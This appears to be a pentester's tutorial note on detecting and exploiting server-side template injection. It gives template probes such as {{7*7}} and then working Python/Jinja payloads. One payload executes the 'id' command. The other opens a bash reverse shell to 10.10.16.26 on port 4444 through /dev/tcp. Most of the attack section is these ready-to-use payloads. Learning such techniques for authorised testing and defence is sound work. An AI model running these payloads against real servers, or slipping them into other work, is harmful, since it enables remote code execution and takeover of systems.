# Plaintext Context SSTI.
## Detection.
The first task we have to do to detect a SSTI vulnerability is to check which is the template that is being used by the server. After that we have two possible ways:
- We extract the server template so we know exactly the programming lenguaje that is being used by the server.
- We have to try the next expressions to realize which one of them are interpreted so we can exactly know which programming lenguage we have to use to deploy our payload.
```javascript
{{7*7}} 
${{7*7}} 
${7*7} 
#{7*7} 
<%= 7*7 %>
```
### Case 1:
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/86a348ed-e521-412d-8e41-3a0b3877dce6" width="600"><br />
### Case 2: 
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/bde33c1d-911c-43da-ae03-ddd2b46bdce1" width="500">
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/a9136b41-09cb-48fd-bc6d-40848bad3d96" width="500">

After that we can check some resources as 1- [PayloadsAllTheThings-SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) or 2- [Hacktricks-SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) to obtain a good payload to use in the target server.

## Payload examples.
Here are some payload examples that in my experience usually work, however, they sometimes may not work properly so we have to check the previous resources to see if we can obtain a useful payload.
### Python.
#### Executing a command:
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
#### Obtaining a shell:
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.16.26/4444 0>&1" ').read() }}
```
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/a6610bf1-9f80-454c-9099-3adee2423d49" width="580">

<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/0bbe557f-a638-43fe-ac61-b39e563d3e83" width="450">





